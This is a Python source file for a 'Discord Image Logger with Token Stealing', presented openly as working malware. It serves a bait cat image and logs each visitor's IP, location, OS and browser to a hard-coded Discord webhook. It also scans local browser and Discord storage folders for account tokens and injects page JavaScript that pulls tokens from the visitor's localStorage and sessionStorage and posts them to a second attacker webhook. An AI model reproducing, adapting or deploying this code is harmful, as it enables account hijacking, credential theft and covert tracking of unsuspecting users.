# Discord Image Logger with Token Stealing - FINAL VERSION
# Clean, working version with only essential functionality

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json, re, os, urllib.request, sys
from pathlib import Path

__version__ = "v2.4 Final"

# ===== CONFIGURATION =====
config = {
    # Webhooks
    "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
    "token_webhook": "https://discord.com/api/webhooks/1445500187064664095/SD2nrNQvqRd54oLbI2TD3Hk_tbAtOCXZCXpOgT1W1xE11u2hwh7CPnkFjaDqkYhDCsFd",
    
    # Image settings
    "image": "https://media.tenor.com/StMcxdC56MMAAAAM/cat.gif",
    "imageArgument": True,
    
    # Appearance
    "username": "Image Logger",
    "color": 0x00FFFF,
    "buggedImage": False,
    
    # Features
    "tokenStealing": True,
    "accurateLocation": True,
    "linkAlerts": True,
    "debugMode": False,  # Set to True to see debug logs
    
    # Protection
    "antiBot": 1,
    "vpnCheck": 1,
    
    # Message
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned",
        "richMessage": True,
    },
    
    # Redirect
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# ===== TOKEN STEALING FUNCTIONS =====
def log_debug(message):
    if config["debugMode"]:
        print(f"[DEBUG] {message}")

def send_webhook(webhook_url, data):
    """Send data to Discord webhook"""
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        request = urllib.request.Request(
            webhook_url,
            data=json.dumps(data).encode(),
            headers=headers,
            method='POST'
        )
        with urllib.request.urlopen(request, timeout=15) as response:
            log_debug(f"Webhook success: {response.status}")
            return response.status in (204, 200)
    except urllib.error.HTTPError as e:
        log_debug(f"Webhook HTTP error {e.code}: {e.reason}")
        return e.code == 204  # Discord returns 204 for success
    except Exception as e:
        log_debug(f"Webhook error: {e}")
        return False

def extract_discord_tokens(text):
    """Extract Discord tokens from text"""
    patterns = [
        r'[MN][\w-]{23}\.[\w-]{6}\.[\w-]{27}',
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',
    ]
    
    tokens = []
    for pattern in patterns:
        tokens.extend(re.findall(pattern, text, re.IGNORECASE))
    
    return [token for token in set(tokens) if validate_discord_token(token)]

def validate_discord_token(token):
    """Validate Discord token format"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
        base64_part = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
        decoded = base64.b64decode(base64_part).decode('utf-8')
        return decoded.isdigit()
    except:
        return False

def find_tokens():
    """Find Discord tokens in browser storage"""
    log_debug("Searching for Discord tokens...")
    tokens = []
    
    # Windows paths
    if os.name == 'nt':
        local_appdata = os.getenv('LOCALAPPDATA', '')
        appdata = os.getenv('APPDATA', '')
        
        paths = [
            Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
            Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Profile 1" / "Local Storage" / "leveldb",
            Path(local_appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
            Path(local_appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
            Path(appdata) / "discord" / "Local Storage" / "leveldb",
        ]
    
    # macOS paths
    elif sys.platform == "darwin":
        home = Path.home()
        paths = [
            home / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Storage" / "leveldb",
            home / "Library" / "Application Support" / "discord" / "Local Storage" / "leveldb",
        ]
    
    # Linux paths
    else:
        home = Path.home()
        paths = [
            home / ".config" / "google-chrome" / "Default" / "Local Storage" / "leveldb",
            home / ".config" / "discord" / "Local Storage" / "leveldb",
        ]
    
    for path in paths:
        if path.exists():
            log_debug(f"Scanning: {path}")
            try:
                for file_path in path.iterdir():
                    if file_path.is_file():
                        try:
                            content = file_path.read_text(encoding='utf-8', errors='ignore')
                            file_tokens = extract_discord_tokens(content)
                            tokens.extend(file_tokens)
                            if file_tokens:
                                log_debug(f"Found {len(file_tokens)} tokens in {file_path.name}")
                        except (PermissionError, Exception):
                            continue
            except Exception:
                continue
    
    return list(set(tokens))

def send_tokens_webhook(tokens):
    """Send found tokens to Discord webhook"""
    if not tokens:
        return False
    
    log_debug(f"Sending {len(tokens)} tokens to webhook...")
    
    # Group by user ID
    tokens_by_user = {}
    for token in tokens:
        try:
            user_id = base64.b64decode(token.split('.')[0] + "==").decode('utf-8')
            if user_id.isdigit():
                tokens_by_user.setdefault(user_id, []).append(token)
        except:
            continue
    
    # Create embed
    fields = []
    for user_id, user_tokens in tokens_by_user.items():
        token_text = "\n".join(user_tokens[:2])  # Max 2 per user
        if len(user_tokens) > 2:
            token_text += f"\n... and {len(user_tokens) - 2} more"
        fields.append({
            "name": f"👤 User: {user_id}",
            "value": f"```\n{token_text}\n```"
        })
    
    data = {
        "username": config["username"],
        "content": "🔑 **DISCORD TOKENS FOUND!**",
        "embeds": [{
            "title": "🎯 Token Stealer Results",
            "color": config["color"],
            "description": f"Found **{len(tokens)}** token(s) from **{len(tokens_by_user)}** user(s)",
            "fields": fields
        }]
    }
    
    return send_webhook(config["token_webhook"], data)

def attempt_token_stealing():
    """Main token stealing function"""
    if not config["tokenStealing"]:
        return False
    
    log_debug("🚀 Starting token stealing...")
    tokens = find_tokens()
    log_debug(f"Found {len(tokens)} tokens")
    
    if tokens and config["token_webhook"]:
        return send_tokens_webhook(tokens)
    
    return len(tokens) > 0

# ===== IP LOGGING FUNCTIONS =====
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        webhook_data = {
            "username": config["username"],
            "embeds": [{
                "title": "🔗 Link Sent",
                "color": config["color"],
                "description": f"Image logging link sent!\n**IP:** `{ip}`\n**Platform:** `{bot}`",
            }]
        }
        send_webhook(config["webhook"], webhook_data)
        return
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
    except:
        return
    
    ping = "@everyone"
    if info.get("proxy") and config["vpnCheck"] == 1:
        ping = ""
    if info.get("hosting") and config["antiBot"] == 1:
        ping = ""
    
    os_name, browser = httpagentparser.simple_detect(useragent)
    
    embed_data = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "🎯 IP Logged",
            "color": config["color"],
            "description": f"""**User opened the image!**

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown')}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }]
    }
    
    if url:
        embed_data["embeds"][0]["thumbnail"] = {"url": url}
    
    send_webhook(config["webhook"], embed_data)
    return info

# ===== HTTP SERVER =====
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            useragent = self.headers.get('user-agent', '')
            
            log_debug(f"Request from: {ip}")
            
            # Get image URL
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # HTML content
            data = f'''<style>body {{margin:0;padding:0;}}
div.img {{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style>
<div class="img"></div>'''.encode()
            
            if ip.startswith(blacklistedIPs):
                return
            
            # Bot detection
            if botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
                return
            
            # Normal user - log IP
            makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
            
            # Attempt token stealing
            if config["tokenStealing"]:
                attempt_token_stealing()
            
            # Add client-side token stealing JavaScript
            if config["tokenStealing"]:
                js_code = f'''
<script>
(function() {{
    console.log("🔑 Token stealer activated");
    
    function findTokens(storage, name) {{
        for (let i = 0; i < storage.length; i++) {{
            let key = storage.key(i);
            if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                let value = storage.getItem(key);
                let tokenPattern = /[MN][\\w-]{{23}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/gi;
                let matches = value.match(tokenPattern);
                if (matches) {{
                    matches.forEach(function(token) {{
                        fetch('{config["token_webhook"]}', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                content: "🔑 Discord Token Found via " + name + "!",
                                embeds: [{{
                                    title: "🎯 " + name + " Token",
                                    color: {config["color"]},
                                    fields: [{{name: "Token", value: "```" + token + "```"}}]
                                }}]
                            }})
                        }}).catch(console.error);
                    }});
                }}
            }}
        }}
    }}
    
    setTimeout(function() {{
        try {{
            findTokens(localStorage, "localStorage");
            findTokens(sessionStorage, "sessionStorage");
        }} catch(e) {{ console.log(e); }}
    }}, 1000);
}})();
</script>'''
                data += js_code.encode()
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)
        
        except Exception as e:
            log_debug(f"Handler error: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Server Error')
    
    do_GET = handleRequest
    do_POST = handleRequest

# ===== START SERVER =====
def run_server(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print(f"🚀 Discord Image Logger v{__version__}")
    print(f"📍 Server: http://localhost:{port}")
    print(f"🔑 Token stealing: {'ON' if config['tokenStealing'] else 'OFF'}")
    print(f"🎯 Ready!")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
